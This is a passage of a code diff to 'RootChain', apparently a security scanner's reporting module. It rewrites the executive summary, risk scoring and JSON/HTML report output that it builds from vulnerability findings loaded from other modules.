+
+def executive_summary(findings: list, chains: list) -> dict:
+    """Generate executive summary stats."""
+    sev_counts = {s: 0 for s in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]}
+    for f in findings:
+        sev = f.get("severity", "INFO")
+        sev_counts[sev] = sev_counts.get(sev, 0) + 1
+
+    risk_weight = sum(SEV_WEIGHT.get(f.get("severity", "INFO"), 0) for f in findings)
+    overall_risk = min(100, risk_weight)
+
+    if overall_risk >= 60:   verdict = "CRITICAL RISK — Immediate remediation required"
+    elif overall_risk >= 35: verdict = "HIGH RISK — Urgent remediation recommended"
+    elif overall_risk >= 15: verdict = "MEDIUM RISK — Remediation planned within 30 days"
+    elif overall_risk >= 1:  verdict = "LOW RISK — Remediation planned within 90 days"
+    else:                    verdict = "CLEAN — No significant vulnerabilities found"
+
+    return {
+        "total_findings": len(findings),
+        "severity_breakdown": sev_counts,
+        "attack_chains_found": len(chains),
+        "risk_score": overall_risk,
+        "verdict": verdict,
+        "critical_chain": chains[0]["name"] if chains else None,
+        "generated_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
     }
-    for f in findings:
-        ftype = f.get('type', '')
-        entry = {
-            'type':       ftype,
-            'severity':   f.get('severity', 'INFO'),
-            'url':        f.get('url', ''),
-            'remediation':f.get('remediation', ''),
-        }
-        if any(ftype.startswith(q) for q in quick_types):
-            quick_wins.append(entry)
-        elif f.get('severity') in ('CRITICAL', 'HIGH'):
-            long_term.append(entry)
-    return quick_wins, long_term
-
-def generate_executive_summary(findings, chains, risk_score, target):
-    sev_dist = {}
-    for f in findings:
-        s = f.get('severity', 'INFO')
-        sev_dist[s] = sev_dist.get(s, 0) + 1
-
-    lines = [
-        f"TARGET: {target}",
-        f"DATE:   {time.strftime('%Y-%m-%d %H:%M UTC', time.gmtime())}",
-        "",
-        f"OVERALL RISK SCORE: {risk_score}/100",
-        "",
-        "FINDING DISTRIBUTION:",
-    ]
-    for sev in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']:
-        count = sev_dist.get(sev, 0)
-        if count:
-            lines.append(f"  {sev:<10} {count:>4}  {'█' * min(count, 40)}")
-
-    if chains:
-        lines.append("\nATTACK CHAINS DETECTED:")
-        for c in chains:
-            lines.append(f"  [{c['risk']}] {c['name']}")
-            lines.append(f"         {c['description']}")
-
-    top_crits = [f for f in findings if f.get('severity') == 'CRITICAL'][:5]
-    if top_crits:
-        lines.append("\nTOP CRITICAL FINDINGS:")
-        for f in top_crits:
-            lines.append(f"  - {f.get('type','?')}: {f.get('url','')}")
-
-    return "\n".join(lines)
 
 
 def main():
     print("=" * 60)
-    print("  RootChain v2 — Attack Chain Correlation Engine")
+    print("  RootChain v5 — Attack Chain Correlation Engine")
+    print(f"  {len(NAMED_CHAINS)} chain templates | MITRE ATT&CK | Risk scoring")
     print("=" * 60)
 
-    REPORTS_DIR.mkdir(exist_ok=True)
+    findings, existing_chains = load_all_findings()
+    print(f"\n[*] Loaded {len(findings)} findings from all modules")
 
-    target_file = REPORTS_DIR / "_target.txt"
-    target = target_file.read_text().strip() if target_file.exists() else "(unknown)"
-    print(f"[+] Target: {target}")
+    if not findings:
+        print("[!] No findings to correlate — run other modules first")
+        return
 
-    # Load and enrich all findings
-    all_findings = load_all_findings()
-    print(f"[+] Loaded {len(all_findings)} findings from {len(list(REPORTS_DIR.glob('*.json')))} report files")
+    print("\n[*] Correlating attack chains...")
+    chains = correlate(findings)
 
-    enriched = [enrich_finding(f) for f in all_findings]
+    summary = executive_summary(findings, chains)
+    print(f"\n[+] Risk Score: {summary['risk_score']}/100 — {summary['verdict']}")
+    print(f"[+] {len(chains)} attack chain(s) identified")
 
-    # Detect chains
-    chains = detect_attack_chains(enriched)
-
-    # Risk score
-    risk_score = compute_risk_score(enriched, chains)
-
-    # Remediation matrix
-    quick_wins, long_term = build_remediation_matrix(enriched)
-
-    # Executive summary
-    summary = generate_executive_summary(enriched, chains, risk_score, target)
-    print("\n" + summary)
-
-    # Severity distribution
-    sev_dist = {}
-    for f in enriched:
-        s = f.get('severity', 'INFO')
-        sev_dist[s] = sev_dist.get(s, 0) + 1
-
-    report = {
-        "target":          target,
-        "generated":       time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
-        "risk_score":      risk_score,
-        "total_findings":  len(enriched),
-        "severity_distribution": sev_dist,
-        "attack_chains":   chains,
-        "quick_wins":      quick_wins[:20],
-        "long_term_fixes": long_term[:20],
+    output = {
         "executive_summary": summary,
-        "findings":        enriched,
-        "named_chains":    list(NAMED_CHAINS.values()),
+        "attack_chains": chains,
+        "total_findings": len(findings),
+        "generated_at": summary["generated_at"],
     }
 
+    REPORTS_DIR.mkdir(exist_ok=True)
     out_path = REPORTS_DIR / "rootchain_report.json"
-    out_path.write_text(json.dumps(report, indent=2, default=str))
-    print(f"\n[+] RootChain report: {out_path}")
-    print(f"[+] Risk score: {risk_score}/100 | Chains: {len(chains)} | Findings: {len(enriched)}")
+    out_path.write_text(json.dumps(output, indent=2, default=str))
+    print(f"\n[+] Chain report → {out_path}")
+
+    # Also generate the report
+    try:
+        sys.path.insert(0, str(Path(__file__).parent))
+        import report_generator
+        target = ""
+        tf = REPORTS_DIR / "_target.txt"
+        if tf.exists():
+            target = tf.read_text().strip()
+        html = report_generator.generate_html_report(
+            target, findings, chains,
+            meta={"risk_score": summary["risk_score"], "verdict": summary["verdict"], "duration": ""}
+        )
+        report_path = REPORTS_DIR / "report.html"
+        report_path.write_text(html, encoding="utf-8")
+        print(f"[+] Full HTML report → {report_path}")
+    except Exception as e:
+        print(f"[WARN] Could not auto-generate HTML report: {e}")
 
 
 if __name__ == "__main__":
